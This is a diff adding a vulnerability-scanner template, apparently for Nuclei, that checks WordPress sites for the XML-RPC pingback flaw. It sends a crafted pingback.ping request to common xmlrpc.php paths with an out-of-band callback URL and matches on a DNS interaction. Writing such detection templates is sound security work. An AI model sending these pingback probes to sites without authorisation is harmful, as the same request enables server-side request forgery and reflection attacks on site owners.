@@ -1,0 +1,52 @@
+id: wordpress-xmlrpc-pingback
+
+info:
+    name: WordPress XML-RPC Pingback Vulnerability
+    author: ProjectDiscoveryAI
+    severity: medium
+    description: |
+        This template checks for the WordPress XML-RPC pingback vulnerability by sending a crafted pingback request and analyzing the response.
+    tags: wordpress, xmlrpc, pingback
+
+http:
+  - raw:
+      - |
+        POST {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Content-Length: {{len(body)}}
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <methodCall>
+        <methodName>pingback.ping</methodName>
+        <params>
+        <param>
+        <value><string>https://{{interactsh-url}}</string></value>
+        </param>
+        <param>
+        <value><string>{{BaseURL}}{{Path}}</string></value>
+        </param>
+        </params>
+        </methodCall>
+    payloads:
+        Path:
+          - "/xmlrpc.php"
+          - "/wp/xmlrpc.php"
+          - "/wordpress/xmlrpc.php"
+          - "/site/xmlrpc.php"
+          - "/blog/xmlrpc.php"
+          - "/xmlrpc"
+    matchers-condition: and
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<value><int>0</int></value>"
+        part: body
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
